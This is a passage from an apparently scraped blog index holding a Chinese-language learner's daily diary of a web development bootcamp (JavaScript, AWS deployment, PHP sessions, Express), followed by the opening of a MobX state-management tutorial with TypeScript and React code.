很多莫名其妙的行為在這堂課裡都有解答，尤其是 hoisting 和 closure 的部分。 另外也總算對「物件導向」這玩意兒有一點概念了，原來沒有我以前想的那麼複雜。 題外話八方雲集田園雞肉水餃好吃！ 許願池不知道明天能不能搞定 AWS 的問題，沒解決的話就會繼續看 [FE201]，總之看情況吧～","link":"/2022/03/06/mentor-program-day82/"},{"title":"mentor-program-day83","text":"一步一步來。 進度今天依然沒有得到 AWS 的回覆，所以我繼續看 [FE201] 的內容： 關於 NaN 這個東西 關於 typeof 和資料型態 檢查一個變數存不存在的正確方式 最容易搞錯的 Scope 從 ECMAScript 來理解閉包與作用域的原理 閉包的應用－cache 機制 如果明天還是 AWS 還是不鳥我，我就要重瓣一個新帳號了。 學到的事情很高興自己總算是把 Scope 和 Clousre 的原理給弄清楚了，也逐漸能夠理解為什麼 Huli 那麼喜歡翻 ECMAScript 來看，畢竟那確實就像是 JavaScript 界的聖經一樣，你可以把裡面說的東西都當成是「真理」。只要照著規格走，你的東西絕對不會有錯。之後有時間的話也許我也會想去翻翻看，看裡面到底還寫了些什麼。 儘管光理解這些東西就花了快一整天的時間，但還是挺值得的。一步一步來，慢慢累積，繼續加油。 題外話減肥的速度永遠跟不上增胖的速度，唉～ 許願池希望明天能把 AWS 搞定，總之一樣要有產出，不要浪費一天。","link":"/2022/03/07/mentor-program-day83/"},{"title":"mentor-program-day84","text":"一切順利真好。 進度AWS 果然還是沒鳥我，所以今天決定重瓣新帳號來弄部署。 大概花了一整天的時間把部署完成，來秀個成果： 留言板 Twitch 感覺自己蠻幸運的，沒有碰到什麼卡關的情形。不過還蠻好奇其他人都卡在什麼地方，明天應該會去研究看看。 雖然網站部署完了，但該做的筆記少不了，還有一些其他細節也都得在調整，總之繼續加油！ 學到的事情在部署時學到的訊息量還蠻大的，像是完全沒摸過的 Linux 作業系統和指令，跟非對稱式加密和 SSH 相關的東西，跟操作遠端的主機等等，這些東西也許得花一些時間來消化和筆記。 也因為這次的部署，理解 FTP 實際上到底在幹嘛用的（以前待的公司有用）。 首先要思考這個問題： 當你有一台主機，它不在你家，而是在很遠的某個地方，可是你想把電腦裡的資料傳給它要怎麼辦？ 第一種作法是透過 CLI： 先用 SSH 連到那台虛擬主機，這樣你就可以操控它了 接著回到本地端，把你想要的檔案上傳到某個可以存檔案的平台（例如：Github） 接著再回到虛擬主機，用 git clone 的方式把檔案抓下來 第二種做法是用 FileZilla： 用 FileZilla 提供的介面跟虛擬主機連線（我想底層應該一樣是透過 SSH） 成功連線後，接下來就很直覺了，因為是圖形化介面，你照著畫面摸就能大概摸出個所以然 這裡在示範怎麼把虛擬主機的 index.php 抓到我的電腦裡。 至於為什麼要用 FileZilla？我覺得理由很簡單，因為比較方便，只是這樣子。 可以思考看看用 CLI 有什麼問題？ 每當要上傳一個新的專案就得重新開一個 Repository 過程中得反覆操作 Git 的指令 只是想修改個小地方就得在本地重新 commit，然後再讓虛擬主機 pull 下來 但用 FileZilla 就不用擔心這些了，可以把它當成是一種 Google Cloud 的感覺，真的方便許多。 題外話最近會開始看一下別人的履歷怎麼寫，感覺一份履歷要同時掌握「你到底會什麼技術」和「不要細節多到讓人覺得你在硬湊」是比較困難的事情。 有些履歷雖然實在寫得非常詳細，但卻會讓人感覺太硬要。甚至還看到有人特地寫了一份 PPT 來描述自己做的某份專案 Before 和 Afrer 的差別。 太詳細真的是好的嗎？有時候會好奇看履歷的人是否在意這些很細的東西？ 總之寫履歷真的是門學問，希望之後自己能把履歷的部分做好。 許願池明天應該會繼續把部署沒完成的地方給做完，然後消化一下今天學到的東西。","link":"/2022/03/08/mentor-program-day84/"},{"title":"mentor-program-day85","text":"消化日。 進度今天延續昨天的部署，新增了「子網域」的網址： 留言板：http://message-board.peanu.tw/ 部落格：http://blog.peanu.tw/ 感覺更有模有樣了一些。雖然可以的話應該要在用個 SSL 會更好，不過目前沒資金，就先到此打住吧。 接下來就是做筆記時間囉： 一刀未剪的 AWS 部署紀錄 怎麼設定子網域？ 網域中 A 和 CNAME 的差別 PHP 如何最新一筆的資料 id？ MySQL 匯出資料庫的方式 學到的事情今天體會最深的是「版本差異」的影響。 在把部落格放到虛擬主機時，網頁馬上就爆了。原以為是資料庫連線的問題，但研究後才發現： 原來是用了太新版本的 PHP 內建函式 簡單來說，我寫「導覽列」的時候寫了一些 PHP 來判定「目前頁面」位置，並加上對應的 Class 名稱。可問題出在我用了 str_contains 這個函式，這是 PHP 8 才推出的東西，而 Ubuntu 上的 PHP 是 7.4： 所以為了這個問題又得重購一次程式碼。不過很巧的是剛好前幾天才學到怎麼處理這個問題，參考這篇：CSS 利用 Signature 來讓導覽列更好寫。 重構之後就能正常運作了，可喜可賀，可喜可賀。 最後想說的是 學會怎麼 debug 也是很重要的事情，尤其是碰到像這種在 Local 端正常，但 Server 端卻有問題時會更加有感。 題外話逐漸邁入課程的尾聲了，希望接下來也能一切順利。 許願池明天會把其他作業做完，也會研究一下補充教材的部分。","link":"/2022/03/09/mentor-program-day85/"},{"title":"mentor-program-day86","text":"不能停下腳步。 進度今天繼續研究和部署相關的東西（深深體會到什麼叫無底洞，能涉入的東西太多了），把部屬的網站加上了 SSL，也看了一些同學的紀錄。不得不佩服某位同學寫的心得：在 AWS 上面部署 LEMP server, PHPmyadmin, FTP ，看完後才發現自已還有很多細節部分沒去設定。不過實在懶了，暫時先這樣吧，畢竟不是真的影響非常大的東西： 懂的設定停損點也是很重要的 - Huli 接下來，為了研究 這份作業 到底怎麼寫，也是去把 [MTR01] 挖出來看，以及看同學的作業。目前算是稍微摸出一點頭緒了，明天大概就能試著做出來吧。 最後附上一下今天的筆記： 什麼是伺服器？ 知道實體 IP 的話可以知道我的位置嗎？ SSH 用別名的方式來連線 伺服器架構 設定 SSL 憑證 資料庫中的 View、Stored Procedure 和 Triggers 學到的事情今天重新複習了後端的伺服器架構，也體會到人家常說「後端的世界很廣」到底是在「廣什麼？」 廣到你腦袋爆炸的那種。 不過有些部分還是蠻有趣的，像是 load balance 和 replication 的架構就蠻人性的，相信在沒有這些架構之前可能常常會有這些情境： 「靠邀，沒想到跳樓大拍賣會吸引這麼多人，伺服器撐不住啦。」 「挫賽，資料庫 GG 了怎麼辦，完全沒有備份阿。」 總之，雖然這些架構看似很複雜，不過也許就是因為踩過了很多「雷」，才體會到什麼是更好的做法。 題外話感覺這幾天進度不夠，但又有點提不起勁。 有時候會想什麼事情都不做，坐在一個陰涼的地方吹吹風，看看風景。不知道自己是不是真的老了～ 許願池明天希望能把架構圖畫完，接著把 week14 給完成。","link":"/2022/03/10/mentor-program-day86/"},{"title":"mentor-program-day87","text":"每天都更往前一步，很好。 進度今天終於把架構圖畫出來了： 雖然看起來很 Low，也忽略了很多細節部分，不過畫完後有更加理解這整個流程，應該還是蠻有幫助的。 接下來就繼續寫剩下的作業，寫到 lock 的部分時發覺自己好像沒有很清楚，解釋的不夠清楚。所以又把 [MTR01] 挖出來複習，把以前做的筆記做得更完整一些：資料庫中的 Transaction 與 Lock。 明天應該就真的能完成作業了，加油加油。 學到的事情在學一個知識時，如果可以「自己做過一遍」，真的對學習的效果確實會比較好。 今天實作了 lock 機制後，才更加理解這東西要怎麼用，還有它的適用場景。另外也因緣際會下摸到了一個新工具：Apache JMeter。 簡單來說就是個用來測試 server 的工具，不過有趣的是我在安裝這個工具時碰了一些小 bug，而 bug 的解法也意外地靠北： 安裝錯版本 官網的 下載頁面 有提供兩種版本，一種是「Binaries」，一種是「Source」，然後我一開始載的是 Source，想說 Binaries 看起來不太像是可以跑的東西。 結果把 JDK（Java Development Kit）裝好後卻還是一直開不起來，無奈之下只好爬文，發現這一篇：How to resolve the error “Unable to access jarfile ApacheJMeter.jar errorlevel=1” while initiating Jmeter? 裡面有人提到： By mistake most people gets source of jmeter downloaded instead of binary . Because of that they don’t find ApacheJmeter.jar file under bin folder . So download binary not the source 簡單來說就是大家都下載成 source 啦，所以難怪開不起來，看來不是只有我一個人 XD 奇妙的主題樣式 這個 bug 也是夠神奇，如果使用「dark」系列的主題（靠北的是預設就是 dark），那就會沒辦法存檔。 詳細可以參考這篇：Why i cannot save the test plan in jmeter? 第一次見過這種 bug，太神啦。 題外話看到美麗的風景會不自覺的放慢速度，享受這樣的寧靜時光。 許願池希望明天把 week14 正式結束，然後進到下一週。","link":"/2022/03/11/mentor-program-day87/"},{"title":"mentor-program-day88","text":"不能掉以輕心。 進度今天重新複習了部署學到的東西，做了一些筆記： Linux 中的指令 理解那些五花八門的專有名詞：IaaS、PaaS 和 SaaS 怎麼突然又跑回去複習？其實是因為看到了這段話： 先來講一下之後十四週的東西十四週會是網站部署，你可能會不知道自己在幹嘛因為根據指定教材的那些教學文，你可能指令複製貼上就搞定了有些人的做事情是：研究 =&gt; 規劃 =&gt; 執行但其實最後少了一步，執行結束之後還需要有個「檢討」當你部署完成之後，重點是你有沒有搞清楚每一步大概在做什麼？我貼的指令是什麼？它的目的是什麼？那些文章沒有附，那就自己去查「學東西沒有學進去」，指的就是複製貼上以後成功了就不管了這就像是考試，考完以後知道哪題對哪題錯，看一看就過了但檢討呢？檢討不見了，而這其實才是最精華的一環無論你題目答對或答錯，其實都還可以再檢討，都可以再進步選擇題你選對了一個項目，那另外三個錯在哪裡？你就多會了三題不要小看了檢討的效益 雖然說我並做沒有「複製貼上」這件事，但在碰到不太懂的東西時確實會有「先這樣吧，剩下的以後再來補」的心態（但通常不會有那個以後）。 也有時候是東西可以運作，功能上沒問題就沒再去細究了。不知道這是不是人的一種惰性，東西正常運作不就代表我做對了嗎？為什麼還要花時間跟心力去研究那些「我認為已經經搞懂的東西？」 但在看完後這段話以後我被打醒了： 你根本沒有完全搞懂，而且還忽略了學習過程中最精華的一部分。 所以才回過頭去把似懂非懂的東西重新研究了一遍，確保自己真的理解，我的每一步到底在做什麼。 之後呢，複習完後就繼續寫簡答題的作業，最後總算是把 week14 完成了吧！ 學到的事情來談談關於寫簡答題的心得吧。 在寫了 14 週的簡答題後，我體會到要怎麼檢測自己對一項知識的理解程度到哪裡？ 有些時後你雖然可以用很簡單的一兩句話來描述某個概念，但這代表你真的理解嗎？也許你知道它的定義，然後呢？你知道為什麼要有這個概念嗎？還有這個概念是因為什麼而產生的？ 在我寫越多次作業後，就越是會思考這些問題。 所以，每當我碰到「雖然答的出來，但卻覺得不完整時」，我會感到心虛。這樣的心虛會促使我再回過頭去查資料，試著重新理解某樣概念，還有它背後的涵義，緣由等等之類的。 其實我不知道這樣是好還是不好，這樣的做法確實能讓你把某樣東西學的很「紮實」，但同時也失去了學習其他「進度」的時間。 總之這是道難題吧，儘管我目前沒有進度問題，但我也還是會擔心自己做了不對的選擇。 題外話今天看了很多 Huli 提到的現實層面問題，特別是和作品相關的。 也許這些我早就知道，自己做的這些作品，在面試官眼裡是個不值得一提的東西，甚至有可能會覺得把這麼基礎的拿東西出來做什麼？ 不過沒關係，至少現在我理解到這些事情，也知道我下一步該怎麼規劃，這點才是最重要的吧。 即便我只有自己一個人，但相信我還是能做到很多事情的。 許願池明天開始進入到複習週的部分。 一直以來我都是以進度為主，但也許這次我該來好好複習一下了，畢竟這幾週有些的東西是我沒接觸過，也相信這些複習帶來的效益也許會比我預期中還要來得多。 最後來個頭尾呼應，不能掉以輕心。","link":"/2022/03/12/mentor-program-day88/"},{"title":"mentor-program-day89","text":"維持自己的步調，不要操之過急。 進度今天一樣看 [MTR01] 複習前幾週的內容，做了一個簡短筆記：資料庫正規化 接著複習完資料庫的部分後，我又回去研究了 session 和 cookie 這小倆口的愛恨情仇。感覺對這兩個概念有在更清楚一些，但還是有些模糊。 像是如果拿 Huli 寫的這篇：白話 Session 與 Cookie：從經營雜貨店開始，我會這樣區分 cookie 和 session： session 是一種讓瀏覽器能夠「記住狀態」的機制，實作的方式有很多種，可以是網址，也可以是 cookie。 cookie 只是一個拿來儲存東西的文字檔，之所以和 session 那麼曖昧是因為大部分會拿它來實作 session 機制。 所以這邊能做個總結：session 是一種讓瀏覽器記住狀態的「機制」，而 cookie 只是實現 session 的一種方式。 但是，如果你到網路上搜尋其他 session 和 cookie 的解釋，例如這篇：Day14-Session與Cookie差別，又會得到不同的觀點，我直接節錄一段： Session 負責紀錄在 server端上的使用者訊息，會在一個用戶完成身分認證後，存下所需的用戶資料，接著產生一組對應的 ID，存入 cookie 後傳回用戶端。 Session泛指有始有終的系列動作/消息，好比會話一般。 簡單來說，大部分人對 session 的定義是： 資料要儲存在 server 端 client 端只會儲存 session_id 總之，我個人還是傾向 Huli 的觀點。雖然你去外面問別人 session 是什麼？一字排開都會告訴你第二種的觀點，但總覺得還是哪裡怪怪？ 哪裡怪？我也不知道，就是怪怪的。 學到的事情研究 session 其實是想複習 PHP 裡面的 session_start() 背後在做什麼，所以就來複習一下吧： 第一步：打開 session1session_start() 執行這一行的時候，可以想成是幫你執行： 1setcookie('PHPSESSID', 'p0s3rb0qd9ih82tbgv120n882p', 'Session'); 接著就會幫你到 tmp 裡建立一個檔案，用來儲存資料： 123456789───tmp ├───ibE87C ├───ibE87D ├───ibE87E ├───ibE88F ├───sess_8oadq07ei2b8g25muckbpfjs8n ├───sess_p0s3rb0qd9ih82tbgv120n882p =&gt; 假設是它吧 ├───sess_gukpo79ueg96nfld2mj5jo2sql ├───why 第二步：設定 session 資料接下來是儲存資料： 1$_SESSION['username'] = 'peanu'; 這一步會自動幫你幫資料存到 sess_p0s3rb0qd9ih82tbgv120n882p 裡面： 12# cat sess_p0s3rb0qd9ih82tbgv120n882pusername|s:5:\"peanu\"; 第三步：結束 session最後是清除資料： 1session_destroy(); 這一步可以想成是「這個 session 結束了，幫我清除所有紀錄」，所以 sess_p0s3rb0qd9ih82tbgv120n882p 會被刪除，而 $_SESSION 也會變成一個空陣列。 主要的流程差不多就是這樣吧。 後來我研究很久的地方是「怎麼把 application 裡的 PHPSESSID 給刪除？」。執行 session_destroy() 雖然能清掉 server 端的資料，但是 client 端的 cookie 還是會保留 PHPSESSID。 我爬了很多文章，也試過了很多種方式，像是直接 set-cookie 讓 cookie 過期，還是改寫值之類的我都是過了，但就是沒有作用。 雖然有點沮喪，但沒關係，就之後再慢慢研究吧。 題外話複習是件需要耐心的事，但還是繼續加油！ 許願池明天繼續複習，希望能把以前不懂的部分給補齊。","link":"/2022/03/13/mentor-program-day89/"},{"title":"mentor-program-day90","text":"這漫長的馬拉松，已經跑了一半了。 進度今天總算是把 [MTR01] 想複習的部分看完了，接著只要把作業做完就能進入下週進度了吧，加油！ 在複習到 session 的部分時，不死心的我又再次搜尋昨天沒解開的謎，結果終於解開了：如何 PHP 正確的清除 session。也找出一開始刪不掉的原因是什麼，原來是 path 的路徑必須一致才行，所以有可能我當初在試的時候都剛好不一致吧，真是的！ 學到的事情今天也是以複習為主，所以好像沒什麼能寫～但總之現在對 session 和 cookie 有比較理解了。 題外話看最近不少人在討論關於作品集的事情，意思是說大家做的東西都太像啦。 這確實是近期的現象，所以最近也一直在思考該怎麼做出一個比較特別的東西才好。 希望我能想出來。 期許希望明天能把複習的部分完成，加油。","link":"/2022/03/14/mentor-program-day90/"},{"title":"mentor-program-day91","text":"希望能有一個不錯的 idea。 進度今天把之前耽擱做的筆記給做完： 從 chmod 認識 Linux 中的權限管理 資料結構－Stack 與 Queue 後來去做了這份測驗：網站前後端開發基礎測試。整體來說蠻順利的，也學到了一些以前沒注意到的細節，是一份很有趣的測驗。 另外，看別人的答案時能觀察到每個人的思路大概如何，這蠻有意思的，因為每個人的想法都差蠻多的。還有答錯的部分其實也很有價值，因為可以很清楚看到誤解的地方在哪，有些就跟我以前的想法一樣，所以還蠻感同身受的。 複習的部分差不多就到這了吧，接著把心得寫完後就能進入下週了。 學到的事情學到了 XSS 不只可以用 &lt;script&gt;，而是有各種奇形怪狀的突變體可以搞垮你的網站。這邊再次向資安人員致敬，這真的不容易 &lt;(_ _)&gt; 還有學會怎麼分析 Error 也是門學問，很多時後「自己想的」不代表「電腦想的」。所以正確的做法是細心地去測試和確認結果，而不是自己瞎掰，如果因為懶就用猜的，很多時候會被打臉。 另外也重新複習了 CROS 的問題，也體會到如果你對一個觀念不完整，在做題目時很快就會漏餡。像在做 Q3 的時候我就疏忽了 preflight request 機制，所以答的不夠精確。 所以呀，有些東西是避不開的，最終都還是得學會的。避的了一時，避不了一世。 題外話有時會覺得比起寫 code，創作才是更困難的事情。 希望我能創作出一份有趣的作品。 期許明天希望能進入下週，努力追進度！","link":"/2022/03/15/mentor-program-day91/"},{"title":"mentor-program-day92","text":"發現了新的東西。 進度這幾天發生了一些事情，所以少了一些時間來趕進度。但我還是會盡量維持下去的，要好好加油。 今天做了一些新的筆記： 你想不到的 XSS 攻擊方式 被遺忘的 Preflight request 做完測驗後才發現有很多細節被我忽略了，好在有發現。 也許未來也會不停碰到像這樣的事情吧，總之要好好往前走下去。 之後也去寫了複習週的心得，寫心得雖然聽起來容易，可實際上還蠻花時間的，你必須去思考在這幾週你學到了什麼？什麼東西讓你印象特別深刻？等等。但我認為在寫的同時可以加深你對某樣知識的理解，所以覺得這是值得去做的事情。 學到的事情今天主要就寫筆記和寫心得，比較特別的是我從別人的心得裡發現了這個：Lidemy 第五期期中測驗。 原來有這樣的東西呀，那我當然要來做做看囉！感覺這份課綱背後真的考慮了不少事情，還是佩服能設計出這些課綱的人。 題外話今天我體會到什麼叫做學以致用。就是當你看到前端做的一蹋糊塗時，倒不如直接去把「生資料」挖出來看： 簡單來說，我想搜尋蝦皮店到店在高雄的據點，可明明搜尋的是「高雄」，卻跳出一堆不相干的結果。 所以呢，這時候學前端的好處就來了，你知道資料基本上都是用 Ajax 去跟後端拿的，所以只要把有可能的 API 抓出來就能拿到「原始資料」了。 接下來就好辦啦，利用「Ctrl + F」來搜尋「高雄」就能馬上知道有幾個搜尋結果了。 不過上面例子是 0，所以結果就是： 蝦皮店到店在高雄還沒有據點 結束。 期許希望明天把測試做完，然後…應該就真的能進入下週了吧。","link":"/2022/03/16/mentor-program-day92/"},{"title":"mentor-program-day93","text":"努力補進度。 進度本來預期今天能入下週進度，但因為一些原因被 delay 了，只好再多等一天了。 今天做了 Lidemy 第五期期中測驗，目前做了三題，明天會接著把最後一題給做完。 因為今天晚上沒辦法用電腦，所以只好改看 [BE201] 當作預習，總之今天大概就是這樣子。 學到的事情在寫測驗時，可以感覺自己對某樣知識的理解程度到哪，雖然說也沒有寫的超級順，但跟最開始比起來感覺進步很多，原本的話應該切板就先卡關了吧。 初探 Express 的感覺還不錯，也看到 MVC 架構的重要之處。有時常常群組裡聽到 PHP 的義大利麵專案折磨了不少人，希望自己不會成為下一個受害者，感覺很可怕 QQ 題外話Express + Node.js 似乎才稱得上是現代後端開發，不過 PHP 還是有一定的影響力。 期許明天一定要趕進度。","link":"/2022/03/17/mentor-program-day93/"},{"title":"mentor-program-day94","text":"總算進入下個進度。 進度今天把剩下的 Lidemy 期中測驗 做完了。發現自己對於物件 or 陣列的操作可能還不夠熟悉，希望以後能在這方面多加強。 順便附上一下做完測驗後寫的筆記： 用 in 運算子檢查 Object 的屬性 JavaScript 整理資料的範例 這個迴圈可能跟你想的不一樣 後來有空也去看了一下 瀏覽器運作導讀，把一些以前不太懂的專有名詞給弄清楚了一些，不過要講很細的話真的還蠻複雜的，之後有機會再研究吧！ 最後開始進入下週的進度，開始把 [FE201] 沒看完的部分給補齊，但差不多快結束了。 學到的事情對於 Process 和 Thread 目前只理解了最表層的部分，之後有機會的話應該會去深入研究看看。如果能理解整個架構的話感覺會學到更多不同的東西。 今天看 [FE201] 學到了很多跟物件導向有關的知識，還有我以前一直沒弄懂的 Prototype，目前筆記做了一半，等完成後就能貼上來這裡了。 今天大概就是這樣，恭喜自己進入下週進度！ 題外話看到不少人儘管年紀大了還是在追求理想，就會希望自己更加堅持下去。 期許希望明天把 [FE201] 看完跟做完筆記，可以順便做作業的話就更好了。","link":"/2022/03/18/mentor-program-day94/"},{"title":"mentor-program-day95","text":"還剩下大概 70 天就結束了。 進度今天把 [FE201] 的部分看完了，也做好了筆記： 什麼是物件導向 ES6 實作物件導向 ES5 實作物件導向 理解原型鍊的運作 new 實際上在做什麼？ 物件導向之繼承 重新理解 this 的值 做完筆記後去看了課綱提供的兩個補充教材，但筆記還沒做完，明天再來補齊吧。 學到的事情今天把我以前最害怕的兩個東西搞懂 90% 了，一個是原型鍊，一個是 this。 還記得以前對 __proto__ 非常頭痛，一來是它本身就長得很奇怪，二來是跟各種 prototype 糾纏不清。也許是因為當時我對物件導向完全沒有概念，所以這東西學起來格外的痛苦。 如果不懂物件導向的話會很難理解 instance.__proto === Class.prototype 之間到底為什麼會有關聯，更無法理解 instance.__proto__.__proto__ === Object.prototype 又是怎麼來的。 所以我現在了解，在學原型鍊以前至少要先理解物件導向的 class 和 instance 是什麼，不然你很難想通原型鍊到底在幹什麼。 接著是 this 這玩意兒。在參與這份計畫前以前，我對 this 理解可以說是亂七八糟，可能第一天我會跟你說 this 指向的是 A ，隔天又跟你說 this 指向的是 B，就是這麼誇張。我一直以來都在逃避學習 this，也許是因為用到的機會不是那麼多（但接觸框架後似乎就不是這回事了），所以就一直擺在那邊了。 this 跟原型鍊一樣，只要搞清楚物件導向後它其實就單純許多，不過要完全搞懂就又是另外一回事了。 要完全懂 this 的話得把 這篇文章 給看懂才行吧。讓我想到一個笑話： 這個作者寫得非常好，看完後我完全不懂了。 題外話相信有朝一日能成為心目中理想的樣子。 期許希望明天能把筆記做完，然後開始寫作業。","link":"/2022/03/19/mentor-program-day95/"},{"title":"mentor-program-day96","text":"繼續往前走。 進度今天把物件導向的補充教材看完了，也依照慣例做了筆記：從 PHP 再探物件導向 後來又花了一點時間看這部有點長的影片：程式導師實驗計畫第二期：Week9-2 JavaScript 執行原理。感覺就當作複習吧，裡面的內容確實和 [JS102] 差不多，不過對複習還是有幫助的。 最後就去做 week16 的作業，雖然還沒做完，但感覺明天就能完成了吧。 學到的事情在做完筆記後，感覺對於物件導向的四大要素有更清楚一些：類別、實體、封裝、繼承。雖然還不知道我會在什麼地方用到它們，但相信總有一天會派上用場的。 以前總覺得能學會原型練、閉包、this、hoisting 的話我就能說自己是「精通 JavaScript」了吧，不過事實是你只會發現有更多的進階的知識要學呢。 但也不討厭這樣，畢竟要成為最強的那個人得付出很多很多很多，而跟真正的強者比起來我付出的可能只是一瞇瞇而已。總之，重要的是看到自己一步一步成長，以前不懂的東西現在弄懂了，就是蠻令人開心的事情。 題外話不知不覺就要邁入 100 天了，加油。 期許希望明天能把 week16 的作業做完。","link":"/2022/03/20/mentor-program-day96/"},{"title":"mentor-program-day97","text":"還是老樣子。 進度今天進度不多，只把 week16 的作業做完而已（練習題跟挑戰還沒），明天得在更努力一點才行。 學到的事情如果作業是簡答題，在寫完後都會習慣把同學寫的拿出來看，看他們是怎麼思考跟敘述一樣東西的。 有些人跟以前的我一樣，會想把每個細節都講得非常清楚，一點點都不能漏掉的那一種。也有些人是極簡派的那一種，只會把比較表層的東西寫出來，剩下的不會細談。 那我呢？在看完後我覺得自己是處於中間的那種，不會講得太細，但也不會太淺，簡單來說就是可能看得懂，但還是要自己在查資料來補充這樣吧。 不過哪一種比較好真的還蠻難說得，雖然寫的詳細比較有機會讓完全不懂的人聽得懂，可是相對的整個篇幅會拉的很長。這時候就會有另外一個問題，會不會看到一半就看不下去了？ 不知道，很難說。 所以教學是件困難的事情，沒有能夠適用於所有人的教材，只有最適合某些人的教材。 題外話第一次吃到直接加生辣椒烹調的井飯，還蠻神奇的口味。 期許希望明天把 week16 做完，然後也許能順便看一些規格書。 當然，能進到下週進度的話當然就更好了。","link":"/2022/03/21/mentor-program-day97/"},{"title":"mentor-program-day98","text":"努力往終點前進。 進度今天把 week16 的練習題給做完了。感覺花了有點長的時間，不過學到的東西我覺得很有趣，所以寫了一篇簡短的文章：閉包的實際應用：throttle 和 debounce 排除掉挑戰題的部分，這週也算是畫下句點了，可以繼續進入下一週了，加油！ 學到的事情今天重新認識閉包的用途，我覺得 throttle 和 debounce 真的蠻實用的，比起「公有方法 / 私有方法」的例子，真的有趣很多。 以前我就碰過如何避免讓 scroll 事件一直重複觸發的問題，但當時沒有花時間去研究，也對閉包不熟，完全不知道可以用在這裡，還蠻可惜的。 總之，今天學到了這兩個應用真好。 另外就是寫作業時為了讓答案能夠通過測試，也花了些時間研究測試檔，學到了 Unit test 的新技術，像是 Mock function（替身函式）這東西。不過還沒時間做筆記，也許明天有空的話會來做一下。 題外話同樣是描述一個東西，A 花了很長的篇幅來解釋，但 B 可能只需要一兩句話能解釋清楚。感覺就和寫程式還蠻像的，有些人就是能用一兩行 code 把東西完成，有些人卻不行。 但是一個能把自然語言說得好的人，就能賭定他寫 code 一定也能寫得好嗎？感覺也不是這樣子。雖然大多數情況是這樣沒錯，可總會有例外情況的存在。 期許希望明天 week17 的進度一切順利。","link":"/2022/03/22/mentor-program-day98/"},{"title":"mentor-program-day99","text":"華麗的趕進度。 進度今天把昨天學的東西做了筆記：一個做 Unit test 可能會用到的方法，後來就去看 [BE201] 了。 雖然進度還不多，但還是一步一步在往前走，繼續加油！ 學到的事情今天是初探 Express 和 MVC 的一天，可以自己控制路由的感覺很不錯，比 Apache + PHP 好用很多。另外 MVC 的架構也很好，雖然還在慢慢習慣這種切割職責的方式，但相信會越越熟悉的。 題外話希望突來的地震沒有傷害到人。 期許明天要繼續努力趕進度。希望可以把 [BE201] 看到 50% 左右。","link":"/2022/03/23/mentor-program-day99/"},{"title":"再探 mobx，換個口味的寫法","text":"蠻有意思的。 簡述附註：後來發現其實這篇的精髓在於「mobx 提供的不同 API」讓你能用不同的方法來建立 store。總之推薦去看這份 官方文件，我覺得寫得還蠻清楚的。 在 來點不一樣的狀態管理 mobx 中已經介紹過基本的 mobx 觀念，忘記的話可以回去複習一下。 當時我們是透過 class 來建立一個 store，把所有 action、computed、state 都寫在一起，像這樣： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import { action, computed, makeObservable, observable } from 'mobx'interface TodoItem { id: number name: string completed: boolean}export class TodoStoreImpl { todos: TodoItem[] = [] constructor() { makeObservable(this, { todos: observable, addTodo: action, toggleTodo: action, states: computed }) } addTodo(name: string): void { const item: TodoItem = { id: new Date().getTime(), name, completed: false } this.todos.push(item) } toggleTodo(id: number): void { const index = this.todos.findIndex((item) =&gt; item.id === id) if (index &gt; -1) { this.todos[index].completed = !this.todos[index].completed } } get states() { let completed: number = 0 let remaining: number = 0 this.todos.forEach((item) =&gt; { if (item.completed) { completed++ } else { remaining++ } }) return { completed, remaining } }}export const TodoStore = new TodoStoreImpl() 簡單來說，我們會先寫好一個 store 的藍圖，接著再把 instance 輸出到外面。 雖然這樣也不錯，不過其實也有不需要透過 class 的寫法，下面就來介紹一下。 範例這邊一樣會拿 Todo list 來當範例，不過在那之前要先介紹一下資料夾結構。 我們現在不會寫成一個 todoStore.ts，而是要拆成這樣的結構： 12345└── state ├── action │&nbsp;&nbsp; └── todo.tsx └── storage └── todo.tsx 簡單來說就是把 action 和 state 給拆開來寫，action/todo.ts 裡面只會放跟 action 有關的東西，而 storage/todo.ts 則會放跟 state 有關的東西。 接著先來看 state 的部分： 12345678910111213141516171819202122232425262728293031import { observable } from 'mobx'type Todo = { id: number name: string completed: boolean}type State = { completed: number remaining: number}export const TodoStorage = observable({ // state todos: [] as Todo[], // computed get state(): State { let completed = 0 let remaining = 0 this.todos.forEach((item) =&gt; { if (item.completed) { completed++ } else { remaining++ } }) return { completed, remaining } }}) 我們會有一個 todos 的 state，跟一個已完成 / 未完成的 computed。 其實就跟 class 的寫法很像，只是現在把東西全部包成一個 object 在丟到 observable 裡面而已。 接著來看 action： 1234567891011121314151617import { action } from 'mobx'import { TodoStorage } from '../storage/todo'export const addTodo = action((name: string): void =&gt; { TodoStorage.todos.push({ id: new Date().getTime(), name, completed: false })})export const toggleTodo = action((id: number): void =&gt; { const index = TodoStorage.todos.findIndex((item) =&gt; item.id === id) if (index &gt; -1) { TodoStorage.todos[index].completed = !TodoStorage.todos[index].completed }}) 我們會有新增 todo 跟更新 todo 的兩個 action。 跟剛剛的做法差不多，我們把用來執行的 function 放到 action 裡面去，這樣就建立完成了。 最後就是跟 Component 串起來而已，我來貼一段： 12345678910111213141516171819202122232425import React from 'react'import { TodoStorage } from '../state/storage/todo'import { toggleTodo } from '../state/action/todo'import { observer } from 'mobx-react-lite'// 別忘了一樣要用 observer 來包住const TodoList: React.FC = observer(() =&gt; { return ( &lt;&gt; Completed: {TodoStorage.state.completed} &lt;br /&gt; Remaining: {TodoStorage.state.remaining} &lt;ul&gt; {TodoStorage.todos.map((item) =&gt; { return ( &lt;li onClick={() =&gt; toggleTodo(item.id)} key={item.id}&gt; [{item.completed ? 'X' : ' '}] {item.name} &lt;/li&gt; ) })} &lt;/ul&gt; &lt;/&gt; )})export default TodoList 以上就是第二種寫法的示範。 我覺得這種寫法在有些時候會更直覺一些，因為透過這種方式在 Component 裡面就不需要把整個 store 引進來，可以只把需要的 action 或 state 拿來用就好，所以會更簡潔一點。 最後老樣子，需要範例的話來 這邊 看。 關於 observer實在不知道這段怎麼下標題，總之這邊想來談談「關於重新渲染的問題」，這跟 mobx 中的 observer 有一些關聯。 我先講結論，就是： observer 無法直接觸發子元件 re-render observer 無法直接觸發子元件 re-render observer 無法直接觸發子元件 re-render 好，我知道這樣講一定聽不懂，所以又到了我們的範例時間。假設我有一段 code 的基本結構長這樣： 1234567891011return ( &lt;div className='app'&gt; &lt;HashRouter&gt; &lt;Header /&gt; &lt;Routes&gt; &lt;Route path='' element={&lt;div&gt;hello&lt;/div&gt;} /&gt; &lt;Route path='login' element={&lt;Login /&gt;} /&gt; &lt;/Routes&gt; &lt;/HashRouter&gt; &lt;/div&gt;) 